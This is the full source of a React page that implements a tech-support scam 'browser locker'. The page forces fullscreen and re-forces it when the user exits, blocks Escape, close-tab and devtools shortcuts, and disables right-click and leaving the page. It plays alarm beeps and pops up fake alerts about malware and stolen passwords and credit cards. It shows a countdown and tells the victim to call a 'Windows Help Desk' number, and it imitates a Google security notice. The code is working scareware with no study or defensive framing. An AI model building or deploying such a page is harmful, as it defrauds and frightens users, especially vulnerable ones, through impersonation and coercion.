'use client';

import { useEffect, useState, useRef } from 'react';

export default function Home() {
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [clicked, setClicked] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [popupMessage, setPopupMessage] = useState('');
  const [shakeScreen, setShakeScreen] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const overlayRef = useRef<HTMLDivElement>(null);
  const audioContextRef = useRef<AudioContext | null>(null);

  const requestFullscreen = async () => {
    try {
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      } else if ((document.documentElement as any).webkitRequestFullscreen) {
        await (document.documentElement as any).webkitRequestFullscreen();
      } else if ((document.documentElement as any).mozRequestFullScreen) {
        await (document.documentElement as any).mozRequestFullScreen();
      }
      setIsFullscreen(true);
    } catch (err) {
      console.log('Fullscreen request failed:', err);
    }
  };

  // Play warning sound using Web Audio API
  const playWarningSound = () => {
    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      }
      
      const audioContext = audioContextRef.current;
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.value = 800;
      oscillator.type = 'square';
      gainNode.gain.value = 0.3;
      
      oscillator.start();
      
      // Beep pattern
      const now = audioContext.currentTime;
      oscillator.frequency.setValueAtTime(800, now);
      oscillator.frequency.setValueAtTime(600, now + 0.1);
      oscillator.frequency.setValueAtTime(800, now + 0.2);
      oscillator.frequency.setValueAtTime(600, now + 0.3);
      oscillator.frequency.setValueAtTime(800, now + 0.4);
      
      gainNode.gain.setValueAtTime(0.3, now);
      gainNode.gain.setValueAtTime(0, now + 0.5);
      
      oscillator.stop(now + 0.5);
    } catch (err) {
      console.log('Audio playback failed:', err);
    }
  };

  const showWarningPopup = (message: string) => {
    setPopupMessage(message);
    setShowPopup(true);
    playWarningSound();
    setShakeScreen(true);
    
    setTimeout(() => {
      setShakeScreen(false);
    }, 500);
    
    setTimeout(() => {
      setShowPopup(false);
    }, 3000);
  };

  // Countdown timer
  useEffect(() => {
    const countdownInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          return 60;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(countdownInterval);
  }, []);

  useEffect(() => {
    // Try to request fullscreen immediately on mount
    requestFullscreen();

    // Also try after a delay (browsers might allow it after page load)
    const timer1 = setTimeout(() => requestFullscreen(), 500);
    const timer2 = setTimeout(() => requestFullscreen(), 1000);
    const timer3 = setTimeout(() => requestFullscreen(), 2000);

    // Play warning sound and show popup periodically
    const warningTimer1 = setTimeout(() => {
      playWarningSound();
      showWarningPopup('⚠️ SECURITY ALERT: Your system is at risk!');
    }, 3000);
    
    const warningTimer2 = setTimeout(() => {
      playWarningSound();
      showWarningPopup('🔒 CRITICAL: Unauthorized access detected!');
    }, 8000);
    
    const warningTimer3 = setTimeout(() => {
      playWarningSound();
      showWarningPopup('🚨 WARNING: Malware infection spreading!');
    }, 15000);

    // Request fullscreen on user interaction as fallback
    if (clicked) {
      requestFullscreen();
    }

    // Prevent escape from fullscreen - more aggressive
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement && !(document as any).webkitFullscreenElement) {
        setTimeout(() => requestFullscreen(), 100);
      }
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);

    // Prevent ALL keyboard shortcuts
    const preventDefault = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    };

    const blockKeys = (e: KeyboardEvent) => {
      // Block Escape, F11, Ctrl+W, Cmd+W, Ctrl+T, Cmd+T, Alt+F4, etc.
      if (
        e.key === 'Escape' ||
        e.key === 'F11' ||
        (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'l' || e.key === 'L')) ||
        (e.metaKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'l' || e.key === 'L')) ||
        (e.altKey && e.key === 'F4') ||
        (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'c' || e.key === 'C' || e.key === 'j' || e.key === 'J'))
      ) {
        return preventDefault(e);
      }
    };

    document.addEventListener('keydown', blockKeys, true);

    // Prevent context menu
    const preventContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      e.stopPropagation();
    };

    document.addEventListener('contextmenu', preventContextMenu, true);

    // Block drag and drop
    const preventDrag = (e: DragEvent) => {
      e.preventDefault();
    };

    document.addEventListener('dragstart', preventDrag, true);
    document.addEventListener('drop', preventDrag, true);

    // Prevent text selection
    document.body.style.userSelect = 'none';
    document.body.style.webkitUserSelect = 'none';

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(warningTimer1);
      clearTimeout(warningTimer2);
      clearTimeout(warningTimer3);
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
      document.removeEventListener('keydown', blockKeys, true);
      document.removeEventListener('contextmenu', preventContextMenu, true);
      document.removeEventListener('dragstart', preventDrag, true);
      document.removeEventListener('drop', preventDrag, true);
      document.body.style.userSelect = '';
      document.body.style.webkitUserSelect = '';
    };
  }, [clicked]);

  const handleClick = () => {
    setClicked(true);
    requestFullscreen();
  };

  // Overlay to block clicks on browser UI
  useEffect(() => {
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  return (
    <>
      <style jsx global>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
          20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
        .animate-shake {
          animation: shake 0.5s ease-in-out;
        }
      `}</style>
      <div 
        className={`min-h-screen bg-red-600 flex flex-col items-center justify-center p-8 font-sans select-none cursor-pointer ${shakeScreen ? 'animate-shake' : ''}`}
        onClick={handleClick}
      >
      {/* Warning Popup */}
      {showPopup && (
        <div className="fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-gray-900 border-2 border-red-500 rounded-lg p-6 z-50 shadow-2xl max-w-md">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h2 className="text-xl font-bold text-white">Security Warning</h2>
          </div>
          <p className="text-white text-lg mb-4">{popupMessage}</p>
          <div className="flex justify-end gap-3">
            <button 
              onClick={(e) => {
                e.stopPropagation();
                setShowPopup(false);
              }}
              className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded font-medium"
            >
              OK
            </button>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className="max-w-2xl w-full bg-red-600 text-white">
        {/* Red Octagon with White X */}
        <div className="flex justify-start mb-8">
          <div className="relative w-20 h-20">
            <svg viewBox="0 0 100 100" className="w-full h-full">
              <polygon
                points="50,5 95,25 95,75 50,95 5,75 5,25"
                fill="#dc2626"
                stroke="#b91c1c"
                strokeWidth="2"
              />
              <text
                x="50"
                y="68"
                textAnchor="middle"
                fill="white"
                fontSize="50"
                fontWeight="bold"
                fontFamily="sans-serif"
              >
                ✕
              </text>
            </svg>
          </div>
        </div>

        {/* Warning Message */}
        <h1 className="text-5xl font-bold mb-6 animate-pulse">
          Your computer has been Locked
        </h1>

        <p className="text-xl mb-8 leading-relaxed">
          Your computer with the IP address 182.74.27.50 has been infected by the Trojans -- Because System Activation KEY has expired & Your information (for example, passwords, messages, and credit cards) have been stolen. Call the Windows Help Desk +1-503-877-9717 (Helpline) to protect your files and identity from further damage.
        </p>

        {/* Countdown Timer */}
        <div className="mb-8 bg-red-800 border-2 border-red-400 rounded-lg p-4">
          <p className="text-lg font-bold text-center">
            ⏰ TIME REMAINING: <span className="text-3xl text-yellow-300">{countdown}</span> seconds
          </p>
          <p className="text-sm text-center mt-2 text-red-200">
            Immediate action required to prevent data loss
          </p>
        </div>

        {/* Checkbox and Link */}
        <div className="flex items-start gap-3 mb-8">
          <input type="checkbox" id="report" className="mt-1 w-5 h-5" />
          <label htmlFor="report" className="text-base">
            Automatically report details of possible security incidents to Google.{" "}
            <a href="#" className="underline hover:no-underline">
              Privacy policy
            </a>
          </label>
        </div>

        {/* Back to Safety Button */}
        <div className="flex justify-end">
          <button className="bg-red-700 hover:bg-red-800 text-white px-8 py-4 rounded-lg font-medium transition-colors text-lg">
            Back to safety
          </button>
        </div>
      </div>

    </div>
    </>
  );
}
